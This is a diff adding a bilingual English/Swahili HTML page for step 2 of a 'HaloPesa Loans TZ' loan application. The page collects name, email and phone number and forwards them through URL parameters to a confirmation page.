@@ -1,0 +1,268 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HaloPesa Loans TZ — Details</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
+
+        body { background: #f7f7f7; min-height: 100vh; display: flex; flex-direction: column; }
+
+        /* HEADER */
+        .header {
+            background: #fff; padding: 14px 20px;
+            display: flex; align-items: center; gap: 14px;
+            border-bottom: 3px solid #F58220;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.04);
+        }
+        .back-arrow {
+            font-size: 22px; color: #333; text-decoration: none;
+            line-height: 1; cursor: pointer; transition: transform 0.2s;
+        }
+        .back-arrow:hover { transform: translateX(-3px); }
+        .logo-box { display: flex; align-items: center; gap: 10px; }
+        .logo-mark {
+            width: 40px; height: 40px; background: #F58220;
+            border-radius: 10px; display: flex; align-items: center;
+            justify-content: center; color: #fff; font-weight: 900; font-size: 18px;
+        }
+        .logo-text { font-weight: 900; font-size: 20px; color: #1a1a1a; letter-spacing: -0.5px; }
+        .logo-text span { color: #F58220; }
+        .header-title { font-size: 14px; font-weight: 700; color: #444; margin-left: auto; }
+
+        /* MAIN */
+        .main { flex: 1; display: flex; justify-content: center; padding: 30px 16px 60px; }
+        .card {
+            background: #fff; width: 100%; max-width: 520px;
+            border-radius: 20px; padding: 36px 30px 32px;
+            box-shadow: 0 8px 30px rgba(0,0,0,0.06); height: fit-content;
+        }
+        .card h1 {
+            font-size: 24px; font-weight: 800; color: #111;
+            text-align: center; margin-bottom: 6px;
+        }
+        .step-text { text-align: center; color: #888; font-size: 13px; margin-bottom: 18px; }
+
+        /* PROGRESS */
+        .progress { display: flex; gap: 8px; justify-content: center; margin-bottom: 30px; }
+        .progress .bar { height: 5px; width: 70px; border-radius: 3px; background: #e5e5e5; }
+        .progress .bar.active { background: #F58220; }
+
+        /* FORM */
+        .form-group { margin-bottom: 20px; }
+        .form-group label {
+            display: block; font-size: 13px; font-weight: 700;
+            color: #333; margin-bottom: 8px;
+        }
+        .form-group input {
+            width: 100%; padding: 14px 16px; font-size: 15px;
+            font-family: inherit; color: #111;
+            border: 1.5px solid #e0e0e0; border-radius: 10px;
+            background: #fff; outline: none;
+            transition: border-color 0.2s, box-shadow 0.2s;
+        }
+        .form-group input:focus {
+            border-color: #F58220;
+            box-shadow: 0 0 0 3px rgba(245,130,32,0.15);
+        }
+        .form-group input::placeholder { color: #aaa; }
+
+        .form-row { display: flex; gap: 14px; }
+        .form-row .form-group { flex: 1; }
+
+        /* Phone row */
+        .phone-row { display: flex; gap: 10px; align-items: stretch; }
+        .country-code {
+            display: flex; align-items: center; justify-content: center;
+            padding: 14px 18px; font-size: 15px; font-weight: 700; color: #333;
+            border: 1.5px solid #e0e0e0; border-radius: 10px;
+            background: #fafafa; white-space: nowrap;
+        }
+        .phone-row input { flex: 1; }
+        .helper-text { font-size: 12px; color: #999; margin-top: 8px; }
+
+        /* BUTTONS */
+        .btn-group { display: flex; gap: 12px; margin-top: 30px; }
+        .prev-btn, .next-btn {
+            flex: 1; padding: 16px; font-size: 15px; font-weight: 800;
+            letter-spacing: 1px; border-radius: 12px; cursor: pointer;
+            text-transform: uppercase; text-align: center;
+            text-decoration: none; display: inline-block;
+            transition: background 0.2s, transform 0.1s;
+            border: none;
+        }
+        .prev-btn { background: #f0f0f0; color: #333; }
+        .prev-btn:hover { background: #e0e0e0; }
+        .next-btn { background: #F58220; color: #fff; }
+        .next-btn:hover { background: #d96f18; }
+        .next-btn:active, .prev-btn:active { transform: scale(0.99); }
+
+        /* FOOTER */
+        .footer {
+            background: #111; color: #F58220; text-align: center;
+            padding: 18px; font-size: 12px; font-weight: 600;
+        }
+
+        @media (max-width: 480px) {
+            .card { padding: 28px 20px; }
+            .card h1 { font-size: 21px; }
+            .progress .bar { width: 55px; }
+            .form-row { flex-direction: column; gap: 0; }
+            .btn-group { flex-direction: column; }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- HEADER -->
+    <header class="header">
+        <a href="apply.html" class="back-arrow">←</a>
+        <div class="logo-box">
+            <div class="logo-mark">H</div>
+            <div class="logo-text">Halo<span>Pesa</span></div>
+        </div>
+        <span class="header-title" id="headerTitle">Mobile Services</span>
+    </header>
+
+    <!-- MAIN -->
+    <main class="main">
+        <div class="card">
+            <h1 id="heading">Loan Application</h1>
+            <p class="step-text" id="stepText">Step 2 of 3</p>
+
+            <div class="progress">
+                <div class="bar active"></div>
+                <div class="bar active"></div>
+                <div class="bar"></div>
+            </div>
+
+            <form id="detailsForm" onsubmit="return false;">
+                <div class="form-row">
+                    <div class="form-group">
+                        <label for="firstName" id="lblFirst">First Name</label>
+                        <input type="text" id="firstName" placeholder="Enter first name">
+                    </div>
+                    <div class="form-group">
+                        <label for="lastName" id="lblLast">Last Name</label>
+                        <input type="text" id="lastName" placeholder="Enter last name">
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label for="email" id="lblEmail">Email Address</label>
+                    <input type="email" id="email" placeholder="you@example.com" required>
+                </div>
+
+                <div class="form-group">
+                    <label for="phone" id="lblPhone">Phone Number</label>
+                    <div class="phone-row">
+                        <span class="country-code">+255</span>
+                        <input type="tel" id="phone" placeholder="7xx xxx xxx" required>
+                    </div>
+                    <p class="helper-text" id="phoneHelper">Enter 9 digits (e.g., 712345678)</p>
+                </div>
+
+                <div class="btn-group">
+                    <a href="apply.html" class="prev-btn" id="prevBtn">Previous</a>
+                    <a href="#" class="next-btn" id="nextBtn">Next Step</a>
+                </div>
+            </form>
+        </div>
+    </main>
+
+    <footer class="footer" id="footer">© 2026 HaloPesa Loans TZ</footer>
+
+    <script>
+        // ─── Language pack ───
+        const LANG = {
+            en: {
+                headerTitle: 'Mobile Services',
+                heading: 'Loan Application',
+                stepText: 'Step 2 of 3',
+                lblFirst: 'First Name',
+                lblLast: 'Last Name',
+                lblEmail: 'Email Address',
+                lblPhone: 'Phone Number',
+                phoneHelper: 'Enter 9 digits (e.g., 712345678)',
+                prevBtn: 'Previous',
+                nextBtn: 'Next Step',
+                footer: '© 2026 HaloPesa Loans TZ',
+                phFirst: 'Enter first name',
+                phLast: 'Enter last name',
+                phEmail: 'you@example.com',
+                phPhone: '7xx xxx xxx'
+            },
+            sw: {
+                headerTitle: 'Huduma za Simu',
+                heading: 'Maombi ya Mkopo',
+                stepText: 'Hatua 2 kati ya 3',
+                lblFirst: 'Jina la Kwanza',
+                lblLast: 'Jina la Mwisho',
+                lblEmail: 'Barua Pepe',
+                lblPhone: 'Namba ya Simu',
+                phoneHelper: 'Weka tarakimu 9 (mfano, 712345678)',
+                prevBtn: 'Nyuma',
+                nextBtn: 'Hatua Ifuatayo',
+                footer: '© 2026 HaloPesa Loans TZ',
+                phFirst: 'Weka jina la kwanza',
+                phLast: 'Weka jina la mwisho',
+                phEmail: 'wewe@mfano.com',
+                phPhone: '7xx xxx xxx'
+            }
+        };
+
+        const lang = localStorage.getItem('lang') || 'en';
+        const t = LANG[lang];
+
+        document.getElementById('headerTitle').textContent = t.headerTitle;
+        document.getElementById('heading').textContent = t.heading;
+        document.getElementById('stepText').textContent = t.stepText;
+        document.getElementById('lblFirst').textContent = t.lblFirst;
+        document.getElementById('lblLast').textContent = t.lblLast;
+        document.getElementById('lblEmail').textContent = t.lblEmail;
+        document.getElementById('lblPhone').textContent = t.lblPhone;
+        document.getElementById('phoneHelper').textContent = t.phoneHelper;
+        document.getElementById('prevBtn').textContent = t.prevBtn;
+        document.getElementById('nextBtn').textContent = t.nextBtn;
+        document.getElementById('footer').textContent = t.footer;
+
+        document.getElementById('firstName').placeholder = t.phFirst;
+        document.getElementById('lastName').placeholder = t.phLast;
+        document.getElementById('email').placeholder = t.phEmail;
+        document.getElementById('phone').placeholder = t.phPhone;
+
+        // ─── Preserve URL params from apply.html ───
+        const incoming = new URLSearchParams(window.location.search);
+
+        // Previous button keeps data intact
+        document.getElementById('prevBtn').addEventListener('click', function () {
+            this.href = 'apply.html?' + incoming.toString();
+        });
+
+        // Next Step: bundle and go to confirm.html
+        document.getElementById('nextBtn').addEventListener('click', function () {
+            const firstName = document.getElementById('firstName').value.trim();
+            const lastName  = document.getElementById('lastName').value.trim();
+            const email     = document.getElementById('email').value.trim();
+            const phone     = document.getElementById('phone').value.trim();
+
+            if (!firstName || !lastName || !email || !phone) {
+                alert(lang === 'sw' ? 'Tafadhali jaza sehemu zote' : 'Please fill all fields');
+                return;
+            }
+
+            const data = new URLSearchParams(incoming);
+            data.set('firstName', firstName);
+            data.set('lastName',  lastName);
+            data.set('email',     email);
+            data.set('phone',     phone);
+            data.set('lang',      lang);
+
+            this.href = 'confirm.html?' + data.toString();
+            window.location.href = this.href;
+        });
+    </script>
+</body>
+</html>
